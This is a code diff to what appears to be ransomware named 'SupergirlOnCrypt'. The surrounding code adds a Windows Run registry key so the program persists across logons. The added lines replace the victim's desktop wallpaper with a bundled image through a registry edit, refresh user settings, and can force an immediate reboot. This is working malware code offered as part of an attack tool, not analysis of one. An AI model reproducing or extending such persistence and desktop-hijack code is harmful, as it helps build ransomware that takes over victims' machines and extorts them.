@@ -10,6 +10,7 @@ import uuid
 import Config
 import json
 import os
+import time
 import requests
 from pathlib import Path
 from Helper import Helper
@@ -60,6 +61,30 @@ def makePersistence():
             cmd = 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "SupergirlOnCrypt" /t REG_SZ /F /D '
             cmd = cmd + '"' + dest + '"'
             os.system('start /wait cmd /c ' + cmd)
+
+            #convert image to bmp cause...windows
+            from PIL import Image
+            file_in = _helper.path("res/wp.jpg")
+            img = Image.open(file_in)
+
+            file_out = str(Path.home()) + '/wp.bmp'
+            if len(img.split()) == 4:
+                # prevent IOError: cannot write mode RGBA as BMP
+                r, g, b, a = img.split()
+                img = Image.merge("RGB", (r, g, b))
+                img.save(file_out)
+            else:
+                img.save(file_out)
+            time.sleep(1)
+            file_out = file_out.replace('/', '\\')
+            os.system('reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d ' + file_out + ' /f')
+            time.sleep(1)
+            os.system('RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters')          
+            if Config.WIN_SHOULD_REBOOT:
+                time.sleep(1)
+                #reboot for wallpaper change
+                os.system("shutdown -t 0 -r -f")
+                _helper.safe_exit()
         elif sys.platform == 'linux' or sys.platform == 'linux2':
             #TODO: Linux persistence
             pass
